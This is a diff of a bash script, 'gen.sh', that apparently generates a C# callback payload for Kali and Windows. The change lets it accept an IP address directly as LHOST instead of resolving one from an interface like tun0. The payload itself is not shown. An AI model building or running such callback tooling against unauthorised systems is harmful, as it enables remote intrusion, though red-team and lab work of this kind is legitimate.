@@ -12,10 +12,10 @@
 #   - Ready-to-paste compile commands for Kali (mcs) and Windows (csc.exe)
 #
 # Usage:
-#   ./gen.sh [interface] [port] [output_dir] [max_retries] [jitter_ms]
+#   ./gen.sh [interface_or_ip] [port] [output_dir] [max_retries] [jitter_ms]
 #
 # Defaults:
-#   interface   = tun0
+#   interface_or_ip = tun0  (accepts interface name OR IP address directly)
 #   port        = 5986
 #   output_dir  = .
 #   max_retries = 5
@@ -47,10 +47,15 @@ if ! [[ "$JITTER_MS" =~ ^[0-9]+$ ]]; then
 fi
 
 # ── Resolve LHOST ──────────────────────────────────────────────────────────────
-LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || true)
-if [[ -z "$LHOST" ]]; then
-    echo "[!] Could not resolve IP from interface: $IFACE" >&2
-    exit 1
+# Accept either an interface name (tun0, eth0) or a direct IP address.
+if [[ "$IFACE" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    LHOST="$IFACE"
+else
+    LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || true)
+    if [[ -z "$LHOST" ]]; then
+        echo "[!] Could not resolve IP from interface: $IFACE" >&2
+        exit 1
+    fi
 fi
 
 echo "[*] LHOST      : $LHOST  ($IFACE)"
